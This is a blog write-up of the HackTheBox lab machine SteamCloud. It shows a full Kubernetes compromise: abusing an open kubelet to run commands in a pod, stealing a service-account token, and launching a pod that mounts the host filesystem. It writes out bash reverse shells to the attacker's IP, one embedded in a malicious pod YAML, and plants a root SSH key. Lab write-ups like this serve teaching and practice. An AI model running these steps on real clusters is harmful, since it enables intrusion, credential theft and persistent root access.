---
title: HTB: SteamCloud
url: https://0xdf.gitlab.io/2022/02/14/htb-steamcloud.html
date: 2022-02-14T10:00:00+00:00
difficulty: Easy [20]
os: Linux
tags: hackthebox, htb-steamcloud, ctf, uni-ctf, nmap, kubernetes, minikube, htb-unobtainium, kubectl, kubeletctl, container
---

![SteamCloud](https://0xdfimages.gitlab.io/img/steamcloud-cover.png)

SteamCloud just presents a bunch of Kubernetes-related ports. Without a way to authenticate, I can’t do anything with the Kubernetes API. But I also have access to the Kubelet running on one of the nodes (which is the same host), and that gives access to the pods running on that node. I’ll get into one and get out the keys necessary to auth to the Kubernetes API. From there, I can spawn a new pod, mounting the host file system into it, and get full access to the host. I’ll eventually manage to turn that access into a shell as well.

## Box Info

| Name | [SteamCloud](https://hackthebox.com/machines/steamcloud)  [SteamCloud](https://hackthebox.com/machines/steamcloud) [Play on HackTheBox](https://hackthebox.com/machines/steamcloud) |
| --- | --- |
| Release Date | [14 Feb 2022](https://twitter.com/hackthebox_eu/status/1493533056552116227) |
| Retire Date | 14 Feb 2022 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creator | [felamos felamos](https://app.hackthebox.com/users/27390) |

## Recon

### nmap

`nmap` found seven open TCP ports, SSH (22), Kubernetes (2379, 2380, and 8443), and InfluxDB (10249, 10250, and 10256):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.133
Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-13 15:22 EST
Nmap scan report for 10.10.11.133
Host is up (0.098s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
2379/tcp  open  etcd-client
2380/tcp  open  etcd-server
8443/tcp  open  https-alt
10249/tcp open  unknown
10250/tcp open  unknown
10256/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 8.87 seconds
oxdf@hacky$ nmap -p 22,2379,2380,8443,10249,10250,10256 -sCV -oA scans/nmap-tcpscripts 10.10.11.133
Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-13 15:25 EST
Nmap scan report for 10.10.11.133
Host is up (0.092s latency).

PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
2379/tcp  open  ssl/etcd-client?
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
2380/tcp  open  ssl/etcd-server?
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
...[snip]...
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2022-02-12T20:29:38
|_Not valid after:  2025-02-12T20:29:38
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=steamcloud@1644784186
| Subject Alternative Name: DNS:steamcloud
| Not valid before: 2022-02-13T19:29:45
|_Not valid after:  2023-02-13T19:29:45
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=2/13%Time=62096946%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,22F,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20a98ba
...[snip]...
SF::{},\"code\":403}\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 226.40 seconds

```

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) versions, the host is likely running Debian 10 buster.

The service on 8443 has a bunch of information about the TLS certificate, which gives a bunch of names:
- minikube/organizationName=system:masters
- minikubeCA
- control-plane.minikube.internal
- kubernetes.default.svc.cluster.local
- kubernetes.default.svc
- kubernetes.default
- kubernetes
- localhost
- 10.10.11.133
- 10.96.0.1
- 127.0.0.1
- 10.0.0.1

Those all seem Kubernetes-related, and match what I saw on [Unobtainium](/2021/09/04/htb-unobtainium.html#nmap).

Based on [this documentation](https://kubernetes.io/docs/reference/ports-and-protocols/), not only are 2379 and 2380 a part of Kubernetes, but the ports that `nmap` labeled as InfluxDB are as well. Based on some of the names, this seems like an instance of [minikube](https://minikube.sigs.k8s.io/docs/):

> minikube quickly sets up a local Kubernetes cluster on macOS, Linux, and Windows. We proudly focus on helping application developers and new Kubernetes users.

### Kubernetes Overview

According to [their docs](https://kubernetes.io/docs/concepts/overview/what-is-kubernetes/), Kubernetes is:

> A portable, extensible, open-source platform for managing containerized workloads and services, that facilitates both declarative configuration and automation. It has a large, rapidly growing ecosystem. Kubernetes services, support, and tools are widely available.

The docs page linked above has a lot more, but the short description is that Kubernetes manages large deployments of containers.

[This page](https://kubernetes.io/docs/concepts/overview/components/) goes over the main components of a Kubernetes cluster, and includes this helpful diagram:

[![Components-of-Kubernetes](https://0xdfimages.gitlab.io/img/components-of-kubernetes.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/components-of-kubernetes.png)

Typically these wouldn’t all be on the same host, but in an environment like HTB, it ends up that way.

So what we’re looking at on TCP 8443 is the main API server for the cluster. A kubelet is an agent running on each node that controls it, and typically listens on TCP 10250.

### Kubernetes API - TCP 8443

TCP 8443 is the default starting port for the [API server in minikube](https://minikube.sigs.k8s.io/docs/commands/start/). Visiting the service in Firefox returns an HTTP 403 with a JSON body:

![image-20220213164430344](https://0xdfimages.gitlab.io/img/image-20220213164430344.png)

The anonymous user can’t `/`.

I can install a tool like `kubectl` (instructions [here](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/)) and try to interact, but it just prompts for auth:

```

oxdf@hacky$ kubectl --server https://10.10.11.133:8443  get pod
Please enter Username: ^C
oxdf@hacky$ kubectl --server https://10.10.11.133:8443 get namespaces
Please enter Username: ^C
oxdf@hacky$ kubectl --server https://10.10.11.133:8443 cluster-info
Please enter Username:

```

### Kubelet API - TCP 10250

The kubelet agent listens on tcp 10250, so perhaps I can interact with a specific node. Trying to visit in Firefox just returns a 404:

![image-20220213165532092](https://0xdfimages.gitlab.io/img/image-20220213165532092.png)

There’s a tool like `kubectl` for kubelets, [kubeletctl](https://github.com/cyberark/kubeletctl). After installing it based on the instructions from the README, I’ll try the `pods` command to list all the pods on the node. There are a bunch:

```

oxdf@hacky$ kubeletctl pods -s 10.10.11.133
┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ storage-provisioner                │ kube-system │ storage-provisioner     │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ coredns-78fcd69978-7dhjv           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 4 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 5 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 6 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 7 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 8 │ kube-proxy-562gf                   │ kube-system │ kube-proxy              │
│   │                                    │             │                         │
└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘

```

The `runningpods` command gives a bunch of JSON about the running pods:

```

oxdf@hacky$ kubeletctl runningpods -s 10.10.11.133                                                 
{       
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {},                     
  "items": [                       
    {                                                 
      "metadata": {                
        "name": "kube-scheduler-steamcloud",
...[snip]...
        "creationTimestamp": null
      },
      "spec": {
        "containers": [
          {
            "name": "kube-proxy",
            "image": "sha256:6120bd723dcedd08f7545da1a8458ad4f23fbd1e94cb578519122f920a77b737",
            "resources": {}
          }
        ]
      },
      "status": {}
    }
  ]
}

```

To make it more readable, I’ll use `jq` to get a list of the name and namespace:

```

oxdf@hacky$ kubeletctl runningpods -s 10.10.11.133 | jq -c '.items[].metadata | [.name, .namespace]'
["kube-proxy-562gf","kube-system"]
["kube-scheduler-steamcloud","kube-system"]
["kube-controller-manager-steamcloud","kube-system"]
["kube-apiserver-steamcloud","kube-system"]
["etcd-steamcloud","kube-system"]
["nginx","default"]
["coredns-78fcd69978-7dhjv","kube-system"]
["storage-provisioner","kube-system"]

```

There’s only one that’s not in the `kube-system` namespace.

## Shell as root in nginx

### exec

With access to the kubelet service, I can also run commands on the containers. I’ll use the `exec` command in `kubeletctl`, giving both the name of the pod (nginx) and the name of the container (nginx):

```

oxdf@hacky$ kubeletctl -s 10.10.11.133 exec "id" -p nginx -c nginx
uid=0(root) gid=0(root) groups=0(root)

```

As root, I can read the `user.txt` in the `/root` directory:

```

oxdf@hacky$ kubeletctl -s 10.10.11.133 exec "ls /root" -p nginx -c nginx
user.txt
oxdf@hacky$ kubeletctl -s 10.10.11.133 exec "cat /root/user.txt" -p nginx -c nginx
e73f21f6************************

```

### Rev Fails

I tried a handful of things to get the container to connect back to me. It does have `bash`:

```

oxdf@hacky$ kubeletctl -s 10.10.11.133 exec "which bash" -p nginx -c nginx
/bin/bash

```

But it won’t do a `bash` reverse shell:

```

oxdf@hacky$ kubeletctl -s 10.10.11.133 exec "bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'" -p nginx -c nginx
-i: -c: line 0: unexpected EOF while looking for matching `''
-i: -c: line 1: syntax error: unexpected end of file
command terminated with exit code 1
oxdf@hacky$ kubeletctl -s 10.10.11.133 exec 'bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"' -p nginx -c nginx
-i: -c: line 0: unexpected EOF while looking for matching `"'
-i: -c: line 1: syntax error: unexpected end of file
command terminated with exit code 1

```

Thinking it might be bad characters, I tried encoded the reverse shell:

```

oxdf@hacky$ echo "bash -i >& /dev/tcp/10.10.14.6/443 0>&1" | base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==
oxdf@hacky$ kubeletctl -s 10.10.11.133 exec 'echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==" | base64 -d | bash' -p nginx -c nginx
"YmFzaCAtaSA JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==" | base64 -d | bash

```

It doesn’t seem to handle the pipes well.

Neither `curl` nor `wget` seem to be in the container:

```

oxdf@hacky$ kubeletctl -s 10.10.11.133 exec "curl 10.10.14.6" -p nginx -c nginx
OCI runtime exec failed: exec failed: container_linux.go:344: starting container process caused "exec: \"curl\": executable file not found in $PATH": unknown
command terminated with exit code 126
oxdf@hacky$ kubeletctl -s 10.10.11.133 exec "wget 10.10.14.6" -p nginx -c nginx
OCI runtime exec failed: exec failed: container_linux.go:344: starting container process caused "exec: \"wget\": executable file not found in $PATH": unknown
command terminated with exit code 126

```

`nc`, `python`, and `python3` aren’t either.

### Shell
*Update 15 Sept 2022: Big thanks to GhostNinja who pointed this out to me.*

It turns out there’s a much simpler way to get a shell - just issue the `bash` (or `sh`) command:

```

oxdf@hacky$ kubeletctl -s 10.10.11.133 exec "/bin/bash" -p nginx -c nginx
root@nginx:/# id
uid=0(root) gid=0(root) groups=0(root)

```

This command is listed on the [HackTricks page for Kubernetes](https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/pentesting-kubernetes-from-the-outside?q=kubeletctr#kubelet-rce). As I failed to get a shell when initially solving the box, the rest of the writeup is operating without this.

## File System as root on SteamCloud

### Enumeration

#### nginx Container

[This page](https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/enumeration-from-a-pod) from HackTricks shows the location of the ServiceAccount object, which is managed by Kubernetes and provides identity within the pod. It gives three typical directories:
- `/run/secrets/kubernetes.io/serviceaccount`
- `/var/run/secrets/kubernetes.io/serviceaccount`
- `/secrets/kubernetes.io/serviceaccout`

In this case, it’s the first one:

```

oxdf@hacky$ kubeletctl -s 10.10.11.133 exec "ls /run/secrets/kubernetes.io/serviceaccount" -p nginx -c nginx
ca.crt  namespace  token

```

These are the three [expected files](https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/enumeration-from-a-pod):

> **ca.crt**: It’s the ca certificate to check kubernetes communications
>
> **namespace**: It indicates the current namespace
>
> **token**: It contains the **service token** of the current pod.

With the `ca.crt` and the `token`, I can authenticate to the cluster.

I’ll save these (`tee` will write them to a file and show them via stdout):

```

oxdf@hacky$ kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee ca.crt
-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
a3ViZUNBMB4XDTIxMTEyOTEyMTY1NVoXDTMxMTEyODEyMTY1NVowFTETMBEGA1UE
...[snip]...

oxdf@hacky$ kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee token
eyJhbGciOiJSUzI1NiIsImtpZCI6Im1aLUpKcmtjMFJTM3hpT083ZUNNLWk2WTRvNENTZWRvMVBZNmpaY1FmMUUifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZ
...[snip]...

```

#### Auth to Kubernetes API

To use `kubectl`, I’ll save the `token` in an environment variable, `token` (to save a lot of copy and pasting):

```

oxdf@hacky$ export token=$(kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx)

```

Now I can pass the `ca.crt` file and the `token` to `kubectl` and it doesn’t ask for a username and password:

```

oxdf@hacky$ kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get pod
NAME    READY   STATUS    RESTARTS   AGE
nginx   1/1     Running   0          14h

```

`get pod` returns information about the running pod! I

#### can-i

The current account can’t do some of the more admin-like things like get information about the namespaces or cluster:

```

oxdf@hacky$ kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get namespaces
Error from server (Forbidden): namespaces is forbidden: User "system:serviceaccount:default:default" cannot list resource "namespaces" in API group "" at the cluster scope
oxdf@hacky$ kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token cluster-info

To further debug and diagnose cluster problems, use 'kubectl cluster-info dump'.
Error from server (Forbidden): services is forbidden: User "system:serviceaccount:default:default" cannot list resource "services" in API group "" in the namespace "kube-system"

```

The `auth can-i` command in `kubectl` is used to see if a given account can take some action. With the `-list` flag, it will show all permissions:

```

oxdf@hacky$ kubectl auth can-i --list --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
pods                                            []                                    []               [get create list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
...[snip]...

```

The important line is the third one, which says this account can `get`, `create`, and `list` pods.

#### nginx Container Info

I’ll grab the details of the current `nginx` container:

```

oxdf@hacky$ kubectl get pod nginx -o yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token
apiVersion: v1                   
kind: Pod            
metadata:         
  annotations:  
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{},"name":"nginx","namespace":"default"},"spec":{"containers":[{"image":"nginx:1.14.2","imagePullPolicy":"Never","name":"nginx","volumeMounts":[{"mountPath":"/root","name":"flag"}]}],"volumes":[{"hostPath":{"
path":"/opt/flag"},"name":"flag"}]}}
  creationTimestamp: "2022-02-13T20:31:02Z"
  name: nginx   
  namespace: default 
  resourceVersion: "511"    
  uid: b204031b-b8af-43c4-af10-add9e03a8ae5
spec:                      
  containers:
  - image: nginx:1.14.2
    imagePullPolicy: Never
    name: nginx                               
    resources: {} 
    terminationMessagePath: /dev/termination-log
    terminationMessagePolicy: File
    volumeMounts:                             
    - mountPath: /root
      name: flag
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: kube-api-access-xtzxg             
      readOnly: true
  dnsPolicy: ClusterFirst
  enableServiceLinks: true
  nodeName: steamcloud                        
  preemptionPolicy: PreemptLowerPriority
  priority: 0
...[snip]...

```

There’s a ton of information here, but the two key parts I need:
- `namespace` is `default`
- `image` is `nginx:1.14.2`

### Shell as root

#### Strategy

Just like in [Unobtainium](/2021/09/04/htb-unobtainium.html#filesystem-as-root), the trick here is to create a pod (container) that has the root file system mapped into it. Then I can execute in the pod, and access the mapped volume, which is the full file system of the host.

#### Pod Description

I’ll grab the same YAML I used in Unbotainium, and update it for this scenario:

```

apiVersion: v1 
kind: Pod
metadata:
  name: 0xdf-pod
  namespace: default
spec:
  containers:
  - name: 0xdf-pod
    image: nginx:1.14.2
    volumeMounts: 
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:  
      path: /
  automountServiceAccountToken: true
  hostNetwork: true

```

The `name` is arbitrary. The `namespace` is the one I’ve been working out of, `default`. I’ll use the image that already exists here, `nginx:1.14.2`. The rest is just setting up the `volumes` / `volumeMounts`. The `volumeMount` says that I’m going to mount a `volume` named `hostfs` into the container at the mount point `/mnt`. Then that volume is defined as `/` on the host file system.

#### Execute Pod

`kubectl apply` is used to start the pod:

```

oxdf@hacky$ kubectl apply -f evil-pod.yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token
pod/0xdf-pod created

oxdf@hacky$ kubectl get pod --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token
NAME       READY   STATUS    RESTARTS   AGE
0xdf-pod   1/1     Running   0          13s
nginx      1/1     Running   0          15h

```

It is visible from the Kubelet as well:

```

oxdf@hacky$ kubeletctl pods -s 10.10.11.133
┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ storage-provisioner                │ kube-system │ storage-provisioner     │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ coredns-78fcd69978-7dhjv           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 4 │ 0xdf-pod                           │ default     │ 0xdf-pod                │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
...[snip]...

```

#### Execute In Pod

Execution via Kubelet works just like it did in the original nginx container:

```

oxdf@hacky$ kubeletctl exec "id" -s 10.10.11.133 -p 0xdf-pod -c 0xdf-pod
uid=0(root) gid=0(root) groups=0(root)

```

But this time the host file system is mounted at `/mnt`:

```

oxdf@hacky$ kubeletctl exec "ls /mnt/" -s 10.10.11.133 -p 0xdf-pod -c 0xdf-pod
bin   home            lib32       media  root  sys  vmlinuz
boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old
dev   initrd.img.old  libx32      opt    sbin  usr
etc   lib             lost+found  proc   srv   var

```

I can read `root.txt`:

```

oxdf@hacky$ kubeletctl exec "cat /mnt/root/root.txt" -s 10.10.11.133 -p 0xdf-pod -c 0xdf-pod
98c251ea************************

```

#### Shell Fails

`kubeletctl` doesn’t seem to process command quite like I’m expecting. I tried creating `/mnt/root/.ssh` and then writing an`authorized_keys` file:

```

oxdf@hacky$ kubeletctl exec "mkdir /mnt/root/.ssh/" -s 10.10.11.133 -p 0xdf-pod -c 0xdf-pod
oxdf@hacky$ kubeletctl exec "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing' >> /mnt/root/.ssh/authorized_keys" -s 10.10.11.133 -p 0xdf-pod -c 0xdf-pod
'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing' >> /mnt/root/.ssh/authorized_keys

```

Looking closely, it seems to echo everything, including the `>> /mnt/root/.ssh/authorized_keys` bit.

I played with `cat`  a bit as well and got the same results:

```

oxdf@hacky$ kubeletctl exec "cat /etc/issue" -s 10.10.11.133 -p 0xdf-pod -c 0xdf-pod
Debian GNU/Linux 9 \n \l

oxdf@hacky$ kubeletctl exec "cat /etc/issue > /tmp/a" -s 10.10.11.133 -p 0xdf-pod -c 0xdf-pod
Debian GNU/Linux 9 \n \l

cat: '>': No such file or directory
cat: /tmp/a: No such file or directory
command terminated with exit code 1
oxdf@hacky$ kubeletctl exec "cat /etc/issue | tee /tmp/a" -s 10.10.11.133 -p 0xdf-pod -c 0xdf-pod
Debian GNU/Linux 9 \n \l

cat: '|': No such file or directory
cat: tee: No such file or directory
cat: /tmp/a: No such file or directory
command terminated with exit code 1

```

It’s treating `>` and `/tmp/a` as arguments for `cat`, not as redirection to a file. The `|` has the same issue.

#### Shell

At this point I was really close to giving up. The only path I see to getting a root shell is to write to the host file system, but nothing I could think of would let me. Then I remembered what I did in Unobtainium. There, I was launching the Alpine container, and if I didn’t give it a startup command, it would launch and immediately die. So I gave it a command:

```

    command: ["/bin/sh"]
    args: ["-c", "sleep 300000"]

```

I’ll create a `evil-pod2.yaml` that’s a copy of the one above, but this time, I’ll add a reverse shell as the command:

```

apiVersion: v1
kind: Pod
metadata:
  name: 0xdf-pod2
  namespace: default
spec:
  containers:
  - name: 0xdf-pod2
    image: nginx:1.14.2
    command: ["/bin/bash"]
    args: ["-c", "/bin/bash -i >& /dev/tcp/10.10.14.6/443 0>&1"]
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true

```

With `nc` listening, I’ll create the pod:

```

oxdf@hacky$ kubectl apply -f evil-pod2.yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token
pod/0xdf-pod2 created

```

Immediately there’s a connection:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.133 51442
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@steamcloud:/#

```

With this shell, I’ll create the `.ssh` folder (if it doesn’t exist from earlier), and write my public key:

```

root@steamcloud:/# mkdir -p /mnt/root/.ssh
root@steamcloud:/mnt# cd /mnt/root/.ssh
root@steamcloud:/mnt/root/.ssh# echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > authorized_keys

```

Now I can SSH as root:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@10.10.11.133
Linux steamcloud 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jan 10 09:00:00 2022
root@steamcloud:~# 

```